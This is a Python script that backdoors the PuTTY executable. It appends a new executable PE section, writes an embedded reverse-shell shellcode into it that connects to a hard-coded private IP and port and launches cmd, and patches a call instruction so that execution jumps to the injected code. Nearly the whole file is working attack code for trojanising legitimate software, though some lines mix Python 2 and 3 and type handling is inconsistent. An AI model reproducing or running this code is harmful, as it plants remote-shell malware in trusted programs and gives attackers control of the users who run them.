import pefile
import mmap
import os

def align(val_to_align, alignment):
    return ((val_to_align + alignment - 1) / alignment) * alignment


exe_path = f"C:\\Users\\{os.getlogin()}\\Documents\\putty.exe"

shellcode_reverse_shell = bytes(
    b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
    b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x00\x02\x04\x68"
    b"\x02\x00\x04\xd2\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
    b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
    b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
    b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
    b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
    b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
    b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
    b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
    b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
    b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\xE9\x5C\x3B\xF5\xFF")

shellcode = shellcode_reverse_shell

# STEP 0x01 - Resize the Executable
# Note: I added some more space to avoid error
original_size = os.path.getsize(exe_path)
fd = open(exe_path, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + 0x2000)
map.close()
fd.close()

# STEP 0x02 - Add the New Section Header
pe = pefile.PE(exe_path)
number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

# Look for valid values for the new section header
raw_size = align(0x1000, file_alignment)
virtual_size = align(0x1000, section_alignment)
raw_offset = align((pe.sections[last_section].PointerToRawData +
                    pe.sections[last_section].SizeOfRawData),
                   file_alignment)

virtual_offset = align((pe.sections[last_section].VirtualAddress +
                        pe.sections[last_section].Misc_VirtualSize),
                       section_alignment)

# CODE | EXECUTE | READ | WRITE
characteristics = 0xE0000020
# Section name must be equal to 8 bytes
name = ".axc" + (4 * '\x00')

# Create the section
# Set the name
pe.set_bytes_at_offset(new_section_offset, name)
# Set the virtual size
pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
# Set the virtual offset
pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
# Set the raw size
pe.set_dword_at_offset(new_section_offset + 16, raw_size)
# Set the raw offset
pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
# Set the following fields to zero
pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))
# Set the characteristics
pe.set_dword_at_offset(new_section_offset + 36, characteristics)

# STEP 0x03 - Modify the Main Headers
pe.FILE_HEADER.NumberOfSections += 1
pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset

pe.write(exe_path)

pe = pefile.PE(exe_path)
number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
ep_shellcode = pe.sections[last_section].VirtualAddress
ep_putty = pe.OPTIONAL_HEADER.AddressOfEntryPoint
pe.OPTIONAL_HEADER.AddressOfEntryPoint = ep_putty

# STEP 0x04 - Inject the Shellcode in the New Section
raw_offset = pe.sections[last_section].PointerToRawData
pe.set_bytes_at_offset(raw_offset, shellcode)

pe.write(exe_path)


with open(exe_path, 'r+b') as file:
    filedata = file.read()

#TODO: could be made dynamically by hashing putty.exe and determining the specific jump

# The following pattern is called only
find___ = b'\xE8\xD3\xBF\xFA\xFF\x83\xC4\x04\x57'
replace = b'\xE9\x48\x18\x0C\x00\x83\xC4\x04\x57'
# E9 48 18 0C 00 83 C4 04 57
# E9 -> OP Code for Jump
# 48 18 0C 00  -> Offset to jump to in little endian order
# 83 C4 04 57 -> Other instructions which aren't changed while replacing

pattern_position = filedata.find(find___)
if pattern_position:
    # Replace the target string
    filedata = filedata.replace(find___, replace)
    with open(exe_path, 'w+b') as file:
        file.write(filedata)
else:
    print "Pattern not Found"
    print "Check if the find pattern was specified correctly!"
